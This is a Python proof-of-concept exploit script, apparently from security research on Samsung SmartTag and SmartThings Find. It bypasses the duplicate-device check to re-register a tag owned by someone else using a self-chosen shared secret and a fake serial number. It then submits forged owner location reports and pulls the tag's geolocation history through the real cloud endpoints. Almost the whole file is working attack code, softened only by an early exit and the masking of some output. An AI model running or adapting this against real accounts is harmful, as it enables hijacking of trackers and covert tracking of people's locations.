# -----------------------------------------------------------
# This script allows an adversary to re-register a tag, bypassing the
# duplicated device profile check in the final registration stage
# 1. this enables both the advsary and the actual owner of a tag to use the fmm services
# 2. this attack can also be axploited by an owner of a SmartTag to create multiple
# custom tags using its identity address and set up each tag to use the FMM service
# (c) 2022 Tingfeng Yu
# -----------------------------------------------------------

from os import access
import requests
from smarttag_gatt_server import *
from utils import *
from script5_get_tokens import *
import json
import time
import argparse
from base64 import urlsafe_b64encode
import pprint

bearer_token = None
shared_secret = 'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQO=' # urlsafe_b64encode( bytes.fromhex("a"*64) ).decode("utf-8").upper()
jwe_token = None
fake_identity_addr = None
location_id = None
room_id = None
requester = None
user_idx = None
fmm_app_id = None
device_name = None
verbose = False

def check_ownership(sn):
    global bearer_token

    req_headers = {
        'Authorization' : 'Bearer ' + bearer_token,
    }
    url = "https://client.smartthings.com/chaser/trackers/lostmessage?serialNumber={}&modelName=EI-T5300&mnId=0AFD&setupId=430".format(sn)
    response = requests.get(url, headers=req_headers)
    url = "https://client.smartthings.com/chaser/trackers/lostmessage?serialNumber={}&modelName=EI-T5300&mnId=0AFD&setupId=430".format("*"*12)
    print("URL: ", url)
    if response.status_code == 200:
        if response.json()["own"] == False:
            log("The tag is currently registered to another account.", 'blue')
            print(response.json())
        else:
            log("The tag is owned by you.",'green')
            print(response.json())
    elif response.status_code == 404:
        log("The tag is not currently registered.",'blue')
        print(response.json())
    else:
        log("Internal server error is caused by deplicated profiles linked to one serial number",'green')
        print(response.json())
    return

def final_stage(sn,identifier):
    global shared_secret, location_id, room_id, fmm_app_id, device_name
    req_headers = {
        'Authorization' : 'Bearer ' + bearer_token,
        'Accept' : 'application/vnd.smartthings+json;v=1',
        'Content-Type': 'application/json; charset=UTF-8'
    }
    req_body = {
        "tagData":{
            "firmware":{
                "specVersion":"0.5.3","version":"01.01.26"},
                "mnId":"0AFD",
                "modelName":"EI-T5300",
                "serialNumber": sn,
                "setupId":"430"
            },
        "cipher":"AES_128-CBC-PKCS7Padding",
        "configurationVersion":"2.0",
        "identifier": identifier,
        "deviceName": device_name,
        "encryptionKey": shared_secret,
        "locationId": location_id,
        "mnmn":"Samsung Electronics",
        "roomId": room_id,
        "vid":"IM-SmartTag-BLE"
    }
    url = "https://client.smartthings.com/miniature/mobile"
    response = requests.post(url, headers=req_headers, json=req_body)
    print("Here's your request (sensitive info is blurred out ***): ")
    print("URL: ", url)
    req_body["tagData"]['serialNumber'] = "*" * 12
    req_body["identifier"] = "*" * 12
    req_body["locationId"] = "*" * len(req_body["locationId"])
    req_body["roomId"] = "*" * len(req_body["roomId"])
    pprint.pprint(req_body)
    
    if response.status_code == 200:
        print("configuration data saved to finalization_response.json:")
        with open('finalization_response_script9.json', 'w') as f:
            json.dump(response.json(), f)

        return response.json()["deviceId"]
    else:
        log("failed to complete the registration",'red')
        print(response.content)
        exit()

def owner_location_report(device_id,lat,lon):
    global jwe_token, requester
    cur_time = int (time.time() * 1000)
    req_headers = {
        "Authorization" : "Bearer " + jwe_token,
        "Content-Type" : "application/json; charset=utf-8"
    }
    req_body = {
        "connectedDevice":
        {
            "id":"11111111-1111-1111-1111-111111111111", # can be anything
            "name":"Galaxy S7 edge"
        },
        "connectedUser":
        {
            "id": requester,
            "name":"T Y"
        },
        "findNode":
        {
            "configuration":
            {
                "allowManualGeolocation":False,
                "allowedNlpGap":2000,
                "src":"chaser"
            },
            "host":"GALAXY_PHONE",
            "id":"a" * 68, # can be anything
            "type":"MOVING",
            "version":"722500014"
        },
        "geolocation":{
            "accuracy":"15.489",
            "battery":"FULL",
            "latitude": str(lat),
            "longitude": str(lon),
            "method":"wifi",
            "rssi":"-45",
            "speed":"0.0",
            "timeStamp":cur_time,
            "valid":True
        },
        "nearby":False,
        "onDemand":False
    }
    url = "https://chaser-ap03-apnortheast2.samsungiotcloud.com/geolocations/" + device_id
    response = requests.post(url, headers=req_headers, json=req_body)
    print("Here's your owner location report (sensitive info is blurred out ***): ")
    print("URL: https://chaser-ap03-apnortheast2.samsungiotcloud.com/geolocations/***... (device_id)")
    req_body["connectedUser"]["name"] = "***"
    req_body["connectedUser"]["id"] = "*" * len(req_body["connectedUser"]["id"])
    pprint.pprint(req_body)
    if not response.status_code == 200:
        log("failed to make a location report, get a new JWE token?",'red')
        exit()
    else:
        log(response.json(),'green')

def remove_device(user,id):
    global bearer_token,user_idx
    ids = user['device_id']
    if id in ids:
        req_headers = {
            'Authorization' : 'Bearer ' + bearer_token,
            'Accept' : 'application/vnd.smartthings+json;v=1',
            'Content-Type': 'application/json; charset=UTF-8'
        }
        url = "https://api.smartthings.com/devices/" + id
        response = requests.delete(url, headers=req_headers)
        if response.status_code == 200:
            print("device {} removed!".format(id))
            user['device_id'].remove(id)
            save_user_info(user,user_idx)
            return
        else:
            print("failed to remove device {}".format(id))
            print(response.content)
    return

# pull reported geo locations
def get_locations(days, device_id):
    global bearer_token, requester, fmm_app_id
    cur_time = time.time()
    start_time = cur_time - (days * 86400)        # 86400 seconds per day
    cur_time = int(cur_time*1000)
    start_time = int(start_time*1000)
    url = 'https://api.smartthings.com/installedapps/{}/execute'.format(fmm_app_id)
    req_body = {
        'parameters':
        {
            'requester': requester,
            'clientType':'aPlugin',
            'extraUri':'/trackers/{}/geolocations?order=asc&startTime={}&endTime={}&isSummary=true&limit=200'.format(device_id, start_time, cur_time),
            'method':'GET',
            'requesterToken':bearer_token,
            'encodedBody':'',
            'clientVersion':'1',
            'uri':'/trackerapi'
        }
    }
    req_headers = {
        'Authorization':'Bearer ' + bearer_token
    }
    geolocations = []
    response = requests.post(url, headers=req_headers, json=req_body)
    if response.status_code == 200:
        print("Here's your location pulling request (sensitive info is blurred out ***): ")
        url = 'https://api.smartthings.com/installedapps/{}/execute'.format("*" * len(fmm_app_id))
        print("URL: ", url)
        req_body["parameters"]['requester'] = "*" * len(req_body["parameters"]['requester'])
        req_body["parameters"]["extraUri"] = '/trackers/{}/geolocations?order=asc&startTime={}&endTime={}&isSummary=true&limit=200'.format("*" * len(device_id), start_time, cur_time)
        req_body["parameters"]["requesterToken"] = "*" * len(req_body["parameters"]["requesterToken"])
        pprint.pprint(req_body)
        if response.json()['statusCode'] == 200:
            geolocations = response.json()['message']['geolocations']
        else:
            log("failed to get locations",'red')
            exit()
    else:
        log("failed to get locations",'red')
        print(response.status_code,response)
        exit()

    log("Here's the geolocation data: ",'green')
    pprint.pprint(geolocations)
    return


def main():
    global bearer_token, shared_secret, jwe_token, fake_identity_addr, location_id, room_id, requester, user_idx, fmm_app_id, device_name,verbose
    print("Please manually configure the user information in user_info.json, then remove this")
    exit()
    
    parser = argparse.ArgumentParser()
    parser.add_argument('--user', dest='user_idx', type=int, default=1, help='--user i (the ith user)')
    parser.add_argument('--attack', dest='attack', type=int, default=1, help='--attack 1 or 2')
    parser.add_argument('--sn', dest='identity_addr', type=str, help='real serial number')
    parser.add_argument('--fake-sn', dest='fake_identity_addr', type=str, help='fake serial number')
    args = parser.parse_args()
    attack = args.attack
    user_idx = args.user_idx
    print("######################### Attack {} Demo #########################".format(attack))
    if attack == 1:
        device_name = "Attack 1 Demo"
        fake_identity_addr = sn
        print("- registering non-registered tag {} for user {}".format(sn[:4] + "*"*8,user_idx))
    else:
        device_name = "Attack 2 Demo"
        sn = args.identity_addr
        fake_identity_addr = args.fake_identity_addr
        print("- registering registered tag {} for user {} using a fake serial number {}".format(sn[:4]+ "*"*8,user_idx,fake_identity_addr[:6]+ "*"*6))
    user = load_user_info(user_idx)
    bearer_token = user['bearer_token']
    jwe_token = user['jwe_token']
    location_id = user['location_id']
    room_id = user['room_id']
    requester = user['requester']
    fmm_app_id = user['fmm_app_id']
    # True: remove the device right after testing | False: keep the registered device
    remove_device_after_registration = True
    log("========================== 1. Skipping Shared Secret Request ==========================",'yellow')
    print("use a self specified shared secret for the finalization request")
    log("========================== 2. Ownership Status Request ==========================",'yellow')
    check_ownership(sn)
    log("========================== 3. Finalization Request ==========================",'yellow')
    device_id = final_stage(sn,fake_identity_addr)
    user['device_id'].append(device_id)
    save_user_info(user,user_idx)
    log("========================== 4. Owner Location Report ==========================",'yellow')
    lat = -35
    lon = 150
    owner_location_report(device_id, lat, lon)
    log("========================== 5. Check Ownership Status again ==========================",'yellow')
    check_ownership(sn)
    if attack == 2:
        log("========================== 6. Confirm that the OF device profile has been setup via location pulling ==========================",'green')
        get_locations(1,device_id)
    if remove_device_after_registration:
        log("========================== Removing The Test Device ==========================",'green')
        remove_device(user, device_id)

if __name__ == '__main__':
    main()
